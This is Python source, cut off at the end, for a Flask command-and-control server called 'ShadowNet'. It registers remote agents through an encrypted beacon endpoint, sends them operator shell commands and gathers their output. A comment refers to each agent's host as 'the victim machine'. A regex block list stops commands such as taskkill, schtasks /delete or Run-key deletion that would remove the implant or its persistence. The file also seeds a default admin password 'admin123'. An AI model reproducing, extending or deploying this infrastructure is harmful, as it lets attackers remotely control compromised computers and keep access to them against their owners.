"""
ShadowNet C2 Server
"""

from flask import Flask, request, jsonify, render_template, session, redirect, url_for, flash
import threading
import time
import uuid
import json
import base64
import os
import secrets
from datetime import datetime
from functools import wraps
from pathlib import Path
from collections import defaultdict
import sys
import traceback as tb
import ipaddress
import re

# =========================
# LOAD ENV
# =========================

from dotenv import load_dotenv

# Try to load from environment variable first (Docker)
env_path = os.environ.get('SHADOWNET_ENV_FILE')
if env_path:
    env_path = Path(env_path)
    if env_path.exists():
        load_dotenv(env_path)
        print(f"[*] Loading env from: {env_path}")
else:
    # Fallback to default location for local development
    env_path = Path(__file__).parent.parent / 'agent' / 'agent.env'
    if env_path.exists():
        load_dotenv(env_path)
        print(f"[*] Loading env from: {env_path}")
    else:
        print(f"[!] No .env file found at {env_path}, using environment variables only")

print(f"[*] Env file exists: {env_path.exists() if env_path else False}")

# =========================
# IMPORTS
# =========================

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    import bcrypt
    from events import (
        create_event,
        AGENT_CONNECTED,
        AGENT_HEARTBEAT,
        TASK_QUEUED,
        TASK_SENT,
        TASK_ACK,
        TASK_COMPLETED
    )
    import incident_engine
    from incident_engine import process_event, calculate_agent_risk
    import database
    print("[+] All modules imported successfully")
except Exception as e:
    print(f"[!] Import error: {e}")
    tb.print_exc()
    sys.exit(1)

# =========================
# CONFIG
# =========================

AES_KEY             = os.environ.get('SHADOWNET_AES_KEY', '').encode()
FLASK_SECRET        = os.environ.get('SHADOWNET_FLASK_SECRET', '').encode()
REGISTRATION_SECRET = os.environ.get('SHADOWNET_REGISTRATION_SECRET', '')

if not AES_KEY or len(AES_KEY) != 32:
    print("[!] FATAL: SHADOWNET_AES_KEY must be exactly 32 bytes")
    sys.exit(1)

if not FLASK_SECRET:
    print("[!] FATAL: SHADOWNET_FLASK_SECRET must be set")
    sys.exit(1)

if not REGISTRATION_SECRET:
    print("[!] FATAL: SHADOWNET_REGISTRATION_SECRET must be set")
    sys.exit(1)

HEARTBEAT_TIMEOUT = 30

# =========================
# FLASK APP
# =========================

frontend_path = Path(__file__).parent / 'Frontend'
template_path = frontend_path / 'templates'
static_path   = frontend_path / 'static'

print(f"[*] Template folder: {template_path}")
print(f"[*] Static folder: {static_path}")
print(f"[*] Template folder exists: {template_path.exists()}")
print(f"[*] Static folder exists: {static_path.exists()}")

app = Flask(__name__,
            template_folder=str(template_path),
            static_folder=str(static_path))
app.secret_key = FLASK_SECRET
print("[+] Flask app created successfully")

# =========================
# HELPER FUNCTIONS
# =========================

def parse_timestamp(timestamp):
    """Convert timestamp to unix timestamp (float)"""
    if isinstance(timestamp, (int, float)):
        return float(timestamp)
    
    # Parse datetime string
    try:
        if isinstance(timestamp, str):
            dt = datetime.fromisoformat(timestamp.replace('Z', '+00:00'))
            return dt.timestamp()
        return float(timestamp)
    except:
        return 0.0


def parse_event_details(details):
    """Parse event details from JSON string or dict"""
    if isinstance(details, str):
        try:
            return json.loads(details)
        except:
            return {}
    return details or {}


def group_heartbeats_into_sessions(events, heartbeat_timeout=30):
    """
    Group consecutive heartbeat events into sessions.
    A session ends when gap between heartbeats exceeds timeout or agent disconnects.
    Returns list of session objects with start_time, end_time, duration, and status.
    """
    sessions = []
    current_session = None
    
    # Sort events by timestamp (oldest first)
    sorted_events = sorted(events, key=lambda e: parse_timestamp(e['timestamp']))
    
    for event in sorted_events:
        timestamp = parse_timestamp(event['timestamp'])
        event_type = event['event_type']
        
        if event_type == 'agent_connected':
            # Start new session on connection
            if current_session:
                current_session['end_time'] = timestamp
                current_session['status'] = 'disconnected'
                sessions.append(current_session)
            
            current_session = {
                'start_time': timestamp,
                'end_time': timestamp,
                'status': 'running',
                'task_ids': []
            }
        
        elif event_type == 'agent_heartbeat':
            if current_session:
                # Check if gap is too large (agent disconnected)
                time_diff = timestamp - current_session['end_time']
                if time_diff > heartbeat_timeout:
                    # Close previous session
                    current_session['status'] = 'disconnected'
                    sessions.append(current_session)
                    
                    # Start new session
                    current_session = {
                        'start_time': timestamp,
                        'end_time': timestamp,
                        'status': 'running',
                        'task_ids': []
                    }
                else:
                    # Extend current session
                    current_session['end_time'] = timestamp
            else:
                # No session yet, create one
                current_session = {
                    'start_time': timestamp,
                    'end_time': timestamp,
                    'status': 'running',
                    'task_ids': []
                }
        
        # Track task events in current session
        elif event_type in ['task_sent', 'task_queued', 'task_completed'] and current_session:
            details = parse_event_details(event['details'])
            task_id = details.get('task_id')
            if task_id and task_id not in current_session['task_ids']:
                current_session['task_ids'].append(task_id)
    
    # Close final session
    if current_session:
        # Check if session is still active (last heartbeat was recent)
        now = time.time()
        time_since_last = now - current_session['end_time']
        if time_since_last > heartbeat_timeout:
            current_session['status'] = 'disconnected'
        sessions.append(current_session)
    
    return sessions


def group_task_events(events):
    """
    Group task-related events by task_id into a timeline.
    Returns dict mapping task_id to list of events (queued, sent, ack, completed).
    """
    task_groups = defaultdict(list)
    
    for event in events:
        event_type = event['event_type']
        if event_type in ['task_queued', 'task_sent', 'task_ack', 'task_completed']:
            details = parse_event_details(event['details'])
            task_id = details.get('task_id')
            if task_id:
                task_groups[task_id].append({
                    'event_type': event_type,
                    'timestamp': event['timestamp'],
                    'details': details
                })
    
    # Sort events within each task group by timestamp
    for task_id in task_groups:
        task_groups[task_id] = sorted(
            task_groups[task_id],
            key=lambda e: parse_timestamp(e['timestamp'])
        )
    
    return dict(task_groups)

# =========================
# DATABASE INIT
# =========================

print("[*] Initializing database...")
try:
    database.init_database()

    admin_password_plain = os.environ.get('SHADOWNET_ADMIN_PASSWORD', 'admin123')
    if admin_password_plain == 'admin123':
        print("[!] WARNING: Using default admin password")

    admin_user = database.get_user('admin')
    if admin_user:
        try:
            test_hash = admin_user['password_hash']
            if not test_hash.startswith('$2b$') and not test_hash.startswith('$2a$'):
                raise ValueError("Not a bcrypt hash")
            print("[+] Admin user exists with valid hash")
        except Exception:
            print("[!] Admin hash corrupted, resetting...")
            new_hash = bcrypt.hashpw(admin_password_plain.encode(), bcrypt.gensalt()).decode()
            database.update_user_password('admin', new_hash)
            print("[+] Admin password reset")
    else:
        admin_hash = bcrypt.hashpw(admin_password_plain.encode(), bcrypt.gensalt()).decode()
        database.create_user('admin', admin_hash, 'admin')
        print("[+] Admin user created")

    print(f"[+] DB stats: {database.get_db_stats()}")

except Exception as e:
    print(f"[!] Database init failed: {e}")
    tb.print_exc()
    sys.exit(1)

# =========================
# DECORATORS
# =========================

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if 'username' not in session:
            return redirect(url_for('login_page'))
        return f(*args, **kwargs)
    return decorated

def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if 'username' not in session:
            return redirect(url_for('login_page'))
        user = database.get_user(session['username'])
        if not user or user['role'] != 'admin':
            # For API routes, return JSON error
            if request.path.startswith('/api/'):
                return jsonify({"error": "Admin access required"}), 403
            # For page routes, redirect with flash message
            flash("Access denied. Admin role required.", "danger")
            return redirect(url_for('dashboard'))
        return f(*args, **kwargs)
    return decorated

def developer_required(f):
    """Allow admin and developer roles"""
    @wraps(f)
    def decorated(*args, **kwargs):
        if 'username' not in session:
            return redirect(url_for('login_page'))
        user = database.get_user(session['username'])
        if not user or user['role'] not in ['admin', 'developer']:
            # For API routes, return JSON error
            if request.path.startswith('/api/'):
                return jsonify({"error": "Developer access required"}), 403
            # For page routes, redirect with flash message
            flash("Access denied. Developer role required.", "danger")
            return redirect(url_for('dashboard'))
        return f(*args, **kwargs)
    return decorated

def operator_required(f):
    """Allow admin, developer, and operator roles (can execute commands)"""
    @wraps(f)
    def decorated(*args, **kwargs):
        if 'username' not in session:
            return redirect(url_for('login_page'))
        user = database.get_user(session['username'])
        if not user or user['role'] not in ['admin', 'developer', 'operator']:
            # For API routes, return JSON error
            if request.path.startswith('/api/'):
                return jsonify({"error": "Operator access required"}), 403
            # For page routes, redirect with flash message
            flash("Access denied. Operator role required to execute commands.", "danger")
            return redirect(url_for('dashboard'))
        return f(*args, **kwargs)
    return decorated

def has_role(required_roles):
    """Check if current user has one of the required roles"""
    if 'username' not in session:
        return False
    user = database.get_user(session['username'])
    if not user:
        return False
    return user['role'] in required_roles

# =========================
# HELPERS
# =========================

def emit_event(event):
    try:
        database.create_event(
            event['event_id'],
            event['agent_id'],
            event['agent_alias'],
            event['event_type'],
            event['details']
        )
        process_event(event)
    except Exception as e:
        print(f"[ERROR] emit_event: {e}")

def encrypt(data):
    aes   = AESGCM(AES_KEY)
    nonce = os.urandom(12)
    ct    = aes.encrypt(nonce, json.dumps(data).encode(), None)
    return base64.b64encode(nonce + ct).decode()

def decrypt(enc):
    raw         = base64.b64decode(enc)
    nonce, ct   = raw[:12], raw[12:]
    aes         = AESGCM(AES_KEY)
    return json.loads(aes.decrypt(nonce, ct, None).decode())

# Force connections to close after each response.
# Prevents Werkzeug dev server from leaving stale keep-alive connections
# open on mobile devices, which causes fetch() to throw "Failed to fetch".
@app.after_request
def set_connection_close(response):
    response.headers['Connection'] = 'close'
    return response

# =========================
# HEALTH CHECK (unauthenticated — used by Render / Docker)
# =========================

@app.route("/health")
def health():
    return jsonify({"status": "ok"}), 200

# =========================
# AUTH ROUTES
# =========================

@app.route("/login", methods=["GET"])
def login_page():
    if 'username' in session:
        return redirect(url_for('dashboard'))
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def login():
    try:
        data     = request.get_json(force=True, silent=True) or {}
        username = data.get('username', '').strip()
        password = data.get('password', '')

        if not username or not password:
            return jsonify({"error": "Username and password required"}), 400

        user = database.get_user(username)

        if not user:
            bcrypt.checkpw(b"dummy", bcrypt.hashpw(b"dummy", bcrypt.gensalt()))
            return jsonify({"error": "Invalid credentials"}), 401

        stored_hash = user['password_hash']
        if isinstance(stored_hash, str):
            stored_hash = stored_hash.encode()

        if bcrypt.checkpw(password.encode(), stored_hash):
            session['username'] = username
            session['role']     = user['role']
            print(f"[+] Login: {username}")
            return jsonify({"success": True, "username": username, "role": user['role']})
        else:
            return jsonify({"error": "Invalid credentials"}), 401

    except Exception as e:
        print(f"[ERROR] login: {e}")
        tb.print_exc()
        return jsonify({"error": "Login failed"}), 500

@app.route("/logout", methods=["POST"])
def logout():
    username = session.get('username', 'unknown')
    session.clear()
    print(f"[+] Logout: {username}")
    return jsonify({"success": True})

@app.route("/api/change-password", methods=["POST"])
@login_required
def change_password():
    try:
        data         = request.json
        old_password = data.get('old_password', '')
        new_password = data.get('new_password', '')

        if not old_password or not new_password:
            return jsonify({"error": "Old and new passwords required"}), 400

        user = database.get_user(session['username'])
        stored_hash = user['password_hash']
        if isinstance(stored_hash, str):
            stored_hash = stored_hash.encode()

        if not bcrypt.checkpw(old_password.encode(), stored_hash):
            return jsonify({"error": "Incorrect password"}), 401

        new_hash = bcrypt.hashpw(new_password.encode(), bcrypt.gensalt()).decode()
        database.update_user_password(session['username'], new_hash)
        return jsonify({"success": True})

    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/session")
def session_check():
    if 'username' in session:
        return jsonify({"logged_in": True, "username": session['username'], "role": session.get('role', 'user')})
    return jsonify({"logged_in": False})

# =========================
# BEACON
# =========================

@app.route("/beacon", methods=["POST"])
def beacon():
    try:
        payload  = decrypt(request.json["data"])
        agent_id = payload.get("agent_id")

        if not agent_id:
            return jsonify({"error": "Invalid request"}), 403

        agent = database.get_agent(agent_id)

        if not agent:
            incoming_secret = payload.get("registration_secret", "")
            if not secrets.compare_digest(incoming_secret, REGISTRATION_SECRET):
                print(f"[!] Rejected unknown agent {agent_id}")
                return jsonify({"error": "Invalid request"}), 403

            alias      = f"A{len(database.get_all_agents()) + 1}"
            auth_token = secrets.token_hex(32)
            # Collect identity info from payload + real remote IP
            reg_hostname   = payload.get("hostname")
            reg_ip         = payload.get("ip_address") or request.remote_addr
            reg_os         = payload.get("os_info")
            reg_user       = payload.get("agent_user")
            database.register_agent(agent_id, alias, 'system', auth_token,
                                    hostname=reg_hostname, ip_address=reg_ip,
                                    os_info=reg_os, agent_user=reg_user)
            agent = database.get_agent(agent_id)
            print(f"[+] New agent registered: {alias} ({agent_id})")

            emit_event(create_event(AGENT_CONNECTED, agent_id, agent['alias']))

        alias = agent['alias']
        database.update_agent_last_seen(agent_id)
        emit_event(create_event(AGENT_HEARTBEAT, agent_id, alias))

        if "ack" in payload:
            task = database.get_task(payload["ack"])
            if task:
                database.update_task_status(payload["ack"], 'ack')
                emit_event(create_event(TASK_ACK, agent_id, alias, {"task_id": payload["ack"]}))

        if "output" in payload and "task_id" in payload:
            task = database.get_task(payload["task_id"])
            if task:
                database.update_task_status(payload["task_id"], 'done', payload["output"])
                emit_event(create_event(
                    TASK_COMPLETED, agent_id, alias,
                    {"task_id": payload["task_id"], "cmd": task['command'], "output": payload["output"]}
                ))
                print(f"\n{'='*50}\n[+] OUTPUT FROM {alias}\n{payload['output']}\n{'='*50}\n")

        task_to_send = None
        pending = database.get_pending_tasks(agent_id)
        if pending:
            database.update_task_status(pending['task_id'], 'sent')
            emit_event(create_event(
                TASK_SENT, agent_id, alias,
                {"task_id": pending['task_id'], "cmd": pending['command']}
            ))
            task_to_send = {"id": pending['task_id'], "cmd": pending['command']}

        return jsonify({"data": encrypt({"task": task_to_send})})

    except Exception as e:
        print(f"[ERROR] beacon: {e}")
        tb.print_exc()
        return jsonify({"error": "Server error"}), 500

# =========================
# API — AGENTS (N+1 fixed)
# =========================

@app.route("/agents")
@login_required
def get_agents():
    try:
        agents        = database.get_all_agents()
        all_tasks     = database.get_all_tasks()
        all_incidents = database.get_all_incidents()

        tasks_by_agent     = defaultdict(list)
        incidents_by_agent = defaultdict(list)

        for task in all_tasks:
            tasks_by_agent[task['agent_id']].append(task)

        for incident in all_incidents:
            incidents_by_agent[incident['agent_id']].append(incident)

        result = []
        for agent in agents:
            agent_tasks     = tasks_by_agent[agent['agent_id']]
            agent_incidents = incidents_by_agent[agent['agent_id']]

            completed = [t for t in agent_tasks if t['status'] == 'done']
            last_task = completed[0] if completed else None

            risk_score, risk_level = calculate_agent_risk(agent['alias'], agent_incidents)

            result.append({
                "alias":      agent['alias'],
                "agent_id":   agent['agent_id'],
                "status":     agent['status'],
                "last_seen":  agent['last_seen'] or "Never",
                "hostname":   agent.get('hostname'),
                "ip_address": agent.get('ip_address'),
                "os_info":    agent.get('os_info'),
                "agent_user": agent.get('agent_user'),
                "risk_score": risk_score,
                "risk_level": risk_level,
                "last_task":  {
                    "cmd":            last_task['command'],
                    "status":         last_task['status'],
                    "output_preview": (last_task['output'][:100] + "...") if last_task.get('output') else None
                } if last_task else None
            })

        return jsonify(result)

    except Exception as e:
        print(f"[ERROR] get_agents: {e}")
        tb.print_exc()
        return jsonify({"error": str(e)}), 500

# =========================
# API — EVENTS / INCIDENTS
# =========================

@app.route("/events")
@login_required
def get_events():
    try:
        return jsonify(database.get_all_events())
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/incidents")
@login_required
def get_incidents():
    try:
        return jsonify(database.get_open_incidents())
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/agent/<alias>")
@login_required
def get_agent_detail(alias):
    try:
        agent = database.get_agent_by_alias(alias)
        if not agent:
            return jsonify({"error": "Agent not found"}), 404

        # Get raw data
        tasks = database.get_agent_tasks(agent['agent_id'])
        events = database.get_agent_events(agent['agent_id'])
        incidents = database.get_agent_incidents(agent['agent_id'])
        
        # Process events into sessions and task groups
        heartbeat_sessions = group_heartbeats_into_sessions(events, HEARTBEAT_TIMEOUT)
        task_event_groups = group_task_events(events)
        
        # Filter out heartbeat events from regular events list
        # Keep only non-heartbeat, non-task events for display
        other_events = [
            e for e in events 
            if e['event_type'] not in ['agent_heartbeat', 'agent_connected', 
                                        'task_queued', 'task_sent', 'task_ack', 
                                        'task_completed']
        ]

        return jsonify({
            "alias": alias,
            "status": agent['status'],
            "last_seen": agent['last_seen'],
            "hostname":   agent.get('hostname'),
            "ip_address": agent.get('ip_address'),
            "os_info":    agent.get('os_info'),
            "agent_user": agent.get('agent_user'),
            "tasks": tasks,
            "events": other_events,  # Other events (not heartbeats or tasks)
            "heartbeat_sessions": heartbeat_sessions,  # New: grouped heartbeat sessions
            "task_event_groups": task_event_groups,   # New: grouped task events
            "incidents": incidents
        })
    except Exception as e:
        tb.print_exc()
        return jsonify({"error": str(e)}), 500

@app.route("/api/incident/<incident_id>")
@login_required
def get_incident_detail(incident_id):
    try:
        incident = database.get_incident(incident_id)
        if not incident:
            return jsonify({"error": "Incident not found"}), 404

        events = database.get_agent_events(incident['agent_id'])
        heartbeat_sessions = group_heartbeats_into_sessions(events, HEARTBEAT_TIMEOUT)
        task_event_groups = group_task_events(events)

        return jsonify({
            "incident": incident,
            "events":   events,
            "tasks":    database.get_agent_tasks(incident['agent_id']),
            "heartbeat_sessions": heartbeat_sessions,
            "task_event_groups":  task_event_groups
        })
    except Exception as e:
        tb.print_exc()
        return jsonify({"error": str(e)}), 500

@app.route("/api/incident/<incident_id>", methods=["PATCH"])
@login_required
def update_incident(incident_id):
    try:
        incident = database.get_incident(incident_id)
        if not incident:
            return jsonify({"error": "Incident not found"}), 404

        database.resolve_incident(incident_id)
        incident_engine.resolve_incident(incident['agent_alias'], incident['type'])
        return jsonify({"message": "Incident resolved"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# =========================
# API — COMMANDS
# =========================

@app.route("/api/commands")
@login_required
def get_commands():
    try:
        return jsonify(database.get_all_command_templates())
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/commands/favorites")
@login_required
def get_favorite_commands():
    try:
        return jsonify(database.get_favorite_commands())
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/commands/categories")
@login_required
def get_command_categories():
    try:
        return jsonify(database.get_command_categories())
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/commands/os-types")
@login_required
def get_os_types():
    try:
        return jsonify(database.get_os_types())
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/commands/by-os/<os_type>")
@login_required
def get_commands_by_os(os_type):
    try:
        return jsonify(database.get_command_templates_by_os(os_type))
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/commands/<int:template_id>/favorite", methods=["POST"])
@login_required
def toggle_favorite(template_id):
    try:
        database.toggle_favorite_command(template_id)
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# =========================
# COMMAND SAFETY FILTER
# Blocks commands that would kill or remove the agent from the victim machine.
# Checked BEFORE the task enters the queue — no way to accidentally self-destruct.
# =========================

# Each tuple: (regex_pattern, human_readable_reason)
AGENT_KILL_PATTERNS = [
    (r'\btaskkill\b',                    'kills running processes (taskkill)'),
    (r'\btskill\b',                      'kills running processes (tskill)'),
    (r'\bkillall\b',                     'kills running processes (killall)'),
    (r'\bkill\s+-9\b',                  'force-kills process (kill -9)'),
    (r'del\s+[^|]*\bagent\b',           'deletes agent binary (del)'),
    (r'del\s+[^|]*\bmain\.exe\b',       'deletes agent binary (del main.exe)'),
    (r'\brm\b[^|]*\bagent\b',           'deletes agent binary (rm)'),
    (r'Remove-Item[^|]*\bagent\b',       'deletes agent binary (Remove-Item)'),
    (r'\bsc\s+(stop|delete)\b',          'stops/removes agent service (sc)'),
    (r'schtasks\s+/delete',              'removes scheduled task persistence'),
    (r'reg\s+delete[^|]*\brun\b',        'removes Run key persistence (reg delete)'),
    (r'\bpkill\b',                       'kills processes by name (pkill)'),
]

def is_agent_kill_command(cmd):
    """
    Returns (True, reason_string) if the command would kill or remove the agent.
    Returns (False, '') if the command is safe to queue.
    """
    for pattern, reason in AGENT_KILL_PATTERNS:
        if re.search(pattern, cmd, re.IGNORECASE):
            return True, reason
    return False, ''


# =========================
# API — TASKS
# =========================

@app.route("/api/task", methods=["POST"])
@login_required
@operator_required
def create_task():
    try:
        data        = request.json
        agent_alias = data.get('agent_alias')
        command     = data.get('command', '').strip()
        template_id = data.get('template_id')

        if not agent_alias or not command:
            return jsonify({"error": "agent_alias and command required"}), 400

        agent = database.get_agent_by_alias(agent_alias)
        if not agent:
            return jsonify({"error": "Agent not found"}), 404

        # Block commands that would kill or remove the agent
        blocked, reason = is_agent_kill_command(command)
        if blocked:
            print(f"[!] BLOCKED by {session['username']}: '{command}' — {reason}")
            # Log as a CRITICAL incident so it shows up in the dashboard
            incident_engine.create_incident(
                agent_alias, "Operator Agent-Kill Attempt", "CRITICAL"
            )
            return jsonify({
                "error": f"Command blocked — {reason}. This would kill or remove the agent.",
                "blocked": True
            }), 403

        task_id = str(uuid.uuid4())
        database.create_task(task_id, agent['agent_id'], command)

        if template_id:
            database.increment_command_usage(template_id)

        emit_event(create_event(
            TASK_QUEUED, agent['agent_id'], agent_alias,
            {"task_id": task_id, "cmd": command}
        ))

        print(f"[+] Task by {session['username']}: {command} -> {agent_alias}")
        return jsonify({"message": "Task created", "task_id": task_id, "agent": agent_alias})

    except Exception as e:
        print(f"[ERROR] create_task: {e}")
        tb.print_exc()
        return jsonify({"error": str(e)}), 500

# =========================
# DASHBOARD STATS API
# =========================

@app.route("/api/dashboard/stats")
@login_required
def dashboard_stats():
    """Get dashboard statistics in one call"""
    try:
        # Get all data
        agents = database.get_all_agents()
        incidents = database.get_all_incidents()
        tasks = database.get_all_tasks()
        events = database.get_all_events()
        
        # Calculate statistics
        now = time.time()
        active_agents = 0
        high_risk_agents = 0
        
        for agent in agents:
            # Check if agent is active
            if agent['last_seen']:
                try:
                    if isinstance(agent['last_seen'], str):
                        last_seen_dt = datetime.fromisoformat(agent['last_seen'])
                    else:
                        last_seen_dt = agent['last_seen']
                    
                    last_seen_timestamp = last_seen_dt.timestamp()
                    time_diff = now - last_seen_timestamp
                    
                    if time_diff < HEARTBEAT_TIMEOUT:
                        active_agents += 1
                except Exception as e:
                    print(f"[ERROR] Processing agent {agent['alias']}: {e}")
            
            # Check risk level
            agent_incidents = [i for i in incidents if i['agent_id'] == agent['agent_id']]
            risk_score, risk_level = calculate_agent_risk(agent['alias'], agent_incidents)
            if risk_level in ['HIGH', 'CRITICAL']:
                high_risk_agents += 1
        
        # Count open incidents
        open_incidents = len([i for i in incidents if i['status'] == 'open'])
        
        # Count completed tasks
        completed_tasks = len([t for t in tasks if t['status'] == 'done'])
        
        # Recent activity
        recent_events = sorted(events, key=lambda e: e['timestamp'], reverse=True)[:10]
        
        return jsonify({
            "active_agents": active_agents,
            "total_agents": len(agents),
            "open_incidents": open_incidents,
            "total_incidents": len(incidents),
            "high_risk_agents": high_risk_agents,
            "completed_tasks": completed_tasks,
            "total_tasks": len(tasks),
            "pending_tasks": len([t for t in tasks if t['status'] == 'queued']),
            "recent_events": recent_events
        })
    except Exception as e:
        print(f"[ERROR] dashboard_stats: {e}")
        tb.print_exc()
        return jsonify({"error": str(e)}), 500

# =========================
# PAGE ROUTES
# =========================

@app.route("/")
@login_required
def dashboard():
    user = database.get_user(session['username'])
    return render_template("dashboard.html", username=session['username'], user_role=user['role'] if user else 'user')

@app.route("/agent/<alias>")
@login_required
def agent_page(alias):
    user = database.get_user(session['username'])
    user_role = user['role'] if user else 'user'
    return render_template("agent_detail.html", alias=alias, user_role=user_role)

@app.route("/incident/<incident_id>")
@login_required
def incident_page(incident_id):
    user = database.get_user(session['username'])
    user_role = user['role'] if user else 'user'
    return render_template("incident_detail.html", incident_id=incident_id, user_role=user_role)

@app.route("/commands")
@login_required
def commands_library():
    return render_template("commands_library.html")

@app.route("/settings")
@admin_required
def settings_page():
    return render_template("settings.html")

@app.route("/admin-panel")
@admin_required
def admin_panel_page():
    """Admin Panel - User management and system administration"""
    try:
        username = session.get('username')
        user = database.get_user(username)
        user_role = user['role'] if user else 'user'
        return render_template("admin_panel.html", username=username, user_role=user_role)
    except Exception as e:
        print(f"[ERROR] admin_panel_page: {e}")
        tb.print_exc()
        return f"Error loading admin panel: {str(e)}", 500

@app.route("/api/admin/verify-password", methods=["POST"])
@login_required
def verify_admin_password():
    """Verify password for sensitive operations"""
    try:
        data = request.json
        password = data.get('password', '')
        
        if not password:
            return jsonify({"error": "Password required"}), 400
        
        user = database.get_user(session['username'])
        if not user:
            return jsonify({"error": "User not found"}), 404
        
        # Check if user is admin
        if user['role'] != 'admin':
            return jsonify({"error": "Admin access required"}), 403
        
        stored_hash = user['password_hash']
        if isinstance(stored_hash, str):
            stored_hash = stored_hash.encode()
        
        if bcrypt.checkpw(password.encode(), stored_hash):
            return jsonify({"success": True, "verified": True})
        else:
            return jsonify({"error": "Invalid password"}), 401
            
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# =========================
# ADMIN API - SETTINGS
# =========================

ACCESS_CONTROL_FILE = Path(__file__).parent / 'access_control.json'

_DEFAULT_ACCESS_CONTROL = {
    'enabled': False,
    'whitelist': ['127.0.0.1', '::1']  # Localhost always allowed
}

def _load_access_control():
    """Load access control settings from JSON file, creating it if missing."""
    if ACCESS_CONTROL_FILE.exists():
        try:
            with open(ACCESS_CONTROL_FILE, 'r') as f:
                return json.load(f)
        except Exception as e:
            print(f"[WARN] Could not read access_control.json: {e}, using defaults")
    return dict(_DEFAULT_ACCESS_CONTROL)

def _save_access_control(settings):
    """Persist access control settings to JSON file."""
    try:
        with open(ACCESS_CONTROL_FILE, 'w') as f:
            json.dump(settings, f, indent=2)
    except Exception as e:
        print(f"[ERROR] Could not save access_control.json: {e}")

# =========================
# API — USER MANAGEMENT
# =========================

@app.route("/api/admin/users", methods=["GET"])
@admin_required
def list_users():
    """Get all users"""
    try:
        conn = database.get_db_connection()
        cursor = conn.cursor()
        cursor.execute('SELECT username, role, created_at FROM users ORDER BY created_at')
        rows = cursor.fetchall()
        conn.close()
        users = [dict(row) for row in rows]
        return jsonify(users)
    except Exception as e:
        print(f"[ERROR] list_users: {e}")
        tb.print_exc()
        return jsonify({"error": str(e)}), 500

@app.route("/api/admin/users", methods=["POST"])
@admin_required
def create_new_user():
    """Create a new user"""
    try:
        data = request.json
        username = data.get('username', '').strip()
        password = data.get('password', '')
        role = data.get('role', 'operator')
        
        if not username or not password:
            return jsonify({"error": "Username and password required"}), 400
        
        if len(password) < 6:
            return jsonify({"error": "Password must be at least 6 characters"}), 400
        
        if role not in ['admin', 'developer', 'operator', 'viewer']:
            return jsonify({"error": "Invalid role"}), 400
        
        # Hash password
        password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
        
        # Create user
        success = database.create_user(username, password_hash, role)
        
        if success:
            print(f"[+] User '{username}' created with role: {role}")
            return jsonify({"message": f"User '{username}' created successfully", "username": username})
        else:
            return jsonify({"error": "Username already exists"}), 400
            
    except Exception as e:
        print(f"[ERROR] create_new_user: {e}")
        tb.print_exc()
        return jsonify({"error": str(e)}), 500

@app.route("/api/admin/users/<username>", methods=["DELETE"])
@admin_required
def delete_existing_user(username):
    """Delete a user"""
    try:
        if username == 'admin':
            return jsonify({"error": "Cannot delete admin user"}), 403
        
        conn = database.get_db_connection()
        cursor = conn.cursor()
        cursor.execute('DELETE FROM users WHERE username = ?', (username,))
        conn.commit()
        count = cursor.rowcount
        conn.close()
        
        if count > 0:
            print(f"[+] User '{username}' deleted")
            return jsonify({"message": f"User '{username}' deleted successfully"})
        else:
            return jsonify({"error": "User not found"}), 404
            
    except Exception as e:
        print(f"[ERROR] delete_existing_user: {e}")
        return jsonify({"error": str(e)}), 500

@app.route("/api/admin/system-info")
@admin_required
def get_system_info():
    try:
        import os
        db_path = Path(__file__).parent / 'shadownet.db'
        db_size = 'Unknown'
        if db_path.exists():
            size_bytes = db_path.stat().st_size
            if size_bytes < 1024:
                db_size = f"{size_bytes} B"
            elif size_bytes < 1024 * 1024:
                db_size = f"{size_bytes / 1024:.2f} KB"
            else:
                db_size = f"{size_bytes / (1024 * 1024):.2f} MB"
        
        agents = database.get_all_agents()
        events = database.get_all_events()
        tasks  = database.get_all_tasks()
        
        return jsonify({
            'db_size':      db_size,
            'total_agents': len(agents),
            'total_events': len(events),
            'total_tasks':  len(tasks),
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route("/api/admin/clear-events", methods=["POST"])
@admin_required
def clear_events():
    try:
        database.clear_events()
        print(f"[+] Events cleared by {session['username']}")
        return jsonify({'success': True, 'message': 'Events cleared'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route("/api/admin/clear-tasks", methods=["POST"])
@admin_required
def clear_completed_tasks():
    try:
        database.clear_completed_tasks()
        print(f"[+] Completed tasks cleared by {session['username']}")
        return jsonify({'success': True, 'message': 'Completed tasks cleared'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route("/api/admin/reset-database", methods=["POST"])
@admin_required
def reset_database():
    try:
        database.reset_database()
        database.init_database()
        # Recreate admin user
        admin_password_plain = os.environ.get('SHADOWNET_ADMIN_PASSWORD', 'admin123')
        admin_hash = bcrypt.hashpw(admin_password_plain.encode(), bcrypt.gensalt()).decode()
        database.create_user('admin', admin_hash, 'admin')
        print(f"[!] DATABASE RESET by {session['username']}")
        return jsonify({'success': True, 'message': 'Database reset'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route("/api/admin/access-control", methods=["GET", "POST"])
@admin_required
def manage_access_control():
    if request.method == 'GET':
        return jsonify(_load_access_control())
    
    try:
        data = request.json
        settings = _load_access_control()
        if 'enabled' in data:
            settings['enabled'] = bool(data['enabled'])
            _save_access_control(settings)
            print(f"[*] Access control {'enabled' if settings['enabled'] else 'disabled'} by {session['username']}")
        return jsonify(settings)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route("/api/admin/access-control/add", methods=["POST"])
@admin_required
def add_ip_to_whitelist():
    try:
        data = request.json
        ip = data.get('ip', '').strip()
        
        if not ip:
